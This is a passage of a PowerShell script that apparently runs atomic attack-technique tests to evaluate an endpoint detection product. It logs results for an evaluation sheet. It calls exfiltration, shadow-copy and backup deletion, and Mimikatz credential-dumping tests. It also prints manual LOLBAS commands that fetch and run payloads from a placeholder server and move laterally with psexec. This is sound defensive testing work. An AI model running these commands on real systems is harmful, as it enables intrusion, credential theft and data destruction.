Invoke-S1Test -TestID "W-177" -Technique "T1041" -TestNumber 2 -TestName "Text Based Data Exfiltration using DNS subdomains" -WaitSec 30
# T1048
Invoke-S1Test -TestID "W-178" -Technique "T1048" -TestNumber 3 -TestName "DNSExfiltration (doh)" -WaitSec 30
# T1048.003
Invoke-S1Test -TestID "W-179" -Technique "T1048.003" -TestNumber 2 -TestName "Exfiltration Over Alternative Protocol - ICMP" -WaitSec 30
Invoke-S1Test -TestID "W-180" -Technique "T1048.003" -TestNumber 4 -TestName "Exfiltration Over Alternative Protocol - HTTP" -WaitSec 30
Invoke-S1Test -TestID "W-181" -Technique "T1048.003" -TestNumber 5 -TestName "Exfiltration Over Alternative Protocol - SMTP" -WaitSec 30
#endregion

#region IMPACT
Write-Host "" 
Write-Host "=======================================================" -ForegroundColor Magenta
Write-Host " TACTIC: IMPACT (15 tests)" -ForegroundColor Magenta
Write-Host "=======================================================" -ForegroundColor Magenta

# T1489
Invoke-S1Test -TestID "W-182" -Technique "T1489" -TestNumber 1 -TestName "Windows - Stop service using Service Controller" -WaitSec 30
Invoke-S1Test -TestID "W-183" -Technique "T1489" -TestNumber 2 -TestName "Windows - Stop service using net.exe" -WaitSec 30
Invoke-S1Test -TestID "W-184" -Technique "T1489" -TestNumber 3 -TestName "Windows - Stop service by killing process" -WaitSec 30
# T1531
Invoke-S1Test -TestID "W-185" -Technique "T1531" -TestNumber 1 -TestName "Change User Password - Windows" -WaitSec 30
# T1485
Invoke-S1Test -TestID "W-186" -Technique "T1485" -TestNumber 1 -TestName "Windows - Overwrite file with SysInternals SDelete" -WaitSec 30
Invoke-S1Test -TestID "W-187" -Technique "T1485" -TestNumber 3 -TestName "Overwrite deleted data on C drive" -WaitSec 30
# T1490
Invoke-S1Test -TestID "W-188" -Technique "T1490" -TestNumber 1 -TestName "Windows - Delete Volume Shadow Copies" -WaitSec 45
Invoke-S1Test -TestID "W-189" -Technique "T1490" -TestNumber 2 -TestName "Windows - Delete Volume Shadow Copies via WMI" -WaitSec 45
Invoke-S1Test -TestID "W-190" -Technique "T1490" -TestNumber 3 -TestName "Windows - wbadmin Delete Windows Backup Catalog" -WaitSec 45
Invoke-S1Test -TestID "W-191" -Technique "T1490" -TestNumber 4 -TestName "Windows - Disable Windows Recovery Console Repair" -WaitSec 45
Invoke-S1Test -TestID "W-192" -Technique "T1490" -TestNumber 5 -TestName "Windows - Delete Volume Shadow Copies via WMI with PowerShel" -WaitSec 45
Invoke-S1Test -TestID "W-193" -Technique "T1490" -TestNumber 6 -TestName "Windows - Delete Backup Files" -WaitSec 45
Invoke-S1Test -TestID "W-194" -Technique "T1490" -TestNumber 7 -TestName "Windows - wbadmin Delete systemstatebackup" -WaitSec 45
Invoke-S1Test -TestID "W-195" -Technique "T1490" -TestNumber 9 -TestName "Disable System Restore Through Registry" -WaitSec 45
Invoke-S1Test -TestID "W-196" -Technique "T1490" -TestNumber 13 -TestName "Windows - Delete Volume Shadow Copies via Diskshadow" -WaitSec 45
#endregion

#region MIMIKATZ-EMULATION
Write-Host ""
Write-Host "="*55 -ForegroundColor Magenta
Write-Host " MIMIKATZ EMULATION (8 tests)" -ForegroundColor Magenta
Write-Host "="*55 -ForegroundColor Magenta

Invoke-S1Test -TestID "MIM-01" -Technique "T1003.001" -TestNumber 7  -TestName "Mimikatz sekurlsa::logonpasswords" -WaitSec 45
Invoke-S1Test -TestID "MIM-02" -Technique "T1003.002" -TestNumber 1  -TestName "Mimikatz lsadump::sam"             -WaitSec 45
Invoke-S1Test -TestID "MIM-03" -Technique "T1003.004" -TestNumber 1  -TestName "Mimikatz lsadump::secrets"         -WaitSec 45
Invoke-S1Test -TestID "MIM-04" -Technique "T1003.006" -TestNumber 1  -TestName "SKIP - DCSync requires AD"         -WaitSec 5
Invoke-S1Test -TestID "MIM-05" -Technique "T1558.003" -TestNumber 1  -TestName "SKIP - Kerberoasting requires AD"  -WaitSec 5
Invoke-S1Test -TestID "MIM-06" -Technique "T1550.002" -TestNumber 1  -TestName "Mimikatz Pass-the-Hash"            -WaitSec 45
Invoke-S1Test -TestID "MIM-07" -Technique "T1547.005" -TestNumber 1  -TestName "Mimikatz misc::memssp SSP inject"  -WaitSec 45
Invoke-S1Test -TestID "MIM-08" -Technique "T1134.001" -TestNumber 1  -TestName "Mimikatz token::elevate"           -WaitSec 45
#endregion

#region MANUAL-LOLBAS
Write-Host ""
Write-Host "="*55 -ForegroundColor Yellow
Write-Host " MANUAL LOLBAS — run these commands by hand" -ForegroundColor Yellow
Write-Host "="*55 -ForegroundColor Yellow
Write-Host "LOL-01: certutil -urlcache -split -f http://YOUR_SERVER/test.dll C:\temp\test.dll" -ForegroundColor White
Write-Host "        regsvr32.exe /s /n /u /i:http://YOUR_SERVER/test.sct scrobj.dll" -ForegroundColor White
Write-Host "LOL-02: mshta.exe vbscript:Execute(CreateObject(WScript.Shell).Run powershell -enc aQBkAA==)" -ForegroundColor White
Write-Host "LOL-03: wmic.exe process call create" -ForegroundColor White
Write-Host "LOL-04: rundll32.exe \\YOUR_SERVER\share\test.dll,DllRegisterServer" -ForegroundColor White
Write-Host "LOL-05: bitsadmin /transfer job /download /priority normal http://YOUR_SERVER/test.exe C:\temp\test.exe" -ForegroundColor White
Write-Host "LOL-06: Office macro to cmd to PowerShell chain" -ForegroundColor White
Write-Host "LOL-07: psexec.exe \\SECOND_HOST -u admin -p pass cmd.exe" -ForegroundColor White
#endregion

#region DONE
Write-Host ""
Write-Host "="*55 -ForegroundColor Green
Write-Host " ALL TESTS COMPLETE" -ForegroundColor Green
Write-Host " Results saved to: $LogFile" -ForegroundColor Green
Write-Host " Import CSV into eval sheet for evidence trail" -ForegroundColor Green
Write-Host "="*55 -ForegroundColor Green
Write-Host ""
Import-Csv $LogFile | Format-Table -AutoSize
#endregion
